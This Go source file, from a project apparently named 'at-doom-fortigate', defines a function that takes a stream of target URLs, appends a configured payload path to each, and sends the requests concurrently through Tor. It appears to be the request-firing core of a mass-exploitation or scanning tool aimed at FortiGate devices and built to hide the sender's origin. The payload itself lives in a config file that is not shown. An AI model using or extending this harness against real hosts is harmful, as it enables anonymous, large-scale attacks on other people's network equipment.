package doom

import (
	"at-doom-fortigate/config"
	"at-doom-fortigate/networking"
	"sync"
)

func FireRequestsWithPayloads(targetsChan <-chan string) <-chan *networking.MiniResponseObject {
	responsesChan := make(chan *networking.MiniResponseObject, config.ResponsesChanBufferSize)

	go func() {
		defer close(responsesChan)
		wg := sync.WaitGroup{}

		// We use this to limit max concurrent requests. We send to chan, fire request and then receive from chan.
		// If channel is full no more requests will be sent.
		sem := make(chan struct{}, config.MaxConcurrentHttpRequests)
		defer close(sem)

		for targetUrl := range targetsChan {
			wg.Add(1)

			go func(url string) {
				defer wg.Done()
				sem <- struct{}{}
				fullTargetUrl := url + config.PayloadPath
				responsesChan <- networking.GetRequestThroughTor(fullTargetUrl)
				_ = <-sem
			}(targetUrl)
		}
		wg.Wait()
	}()

	return responsesChan
}
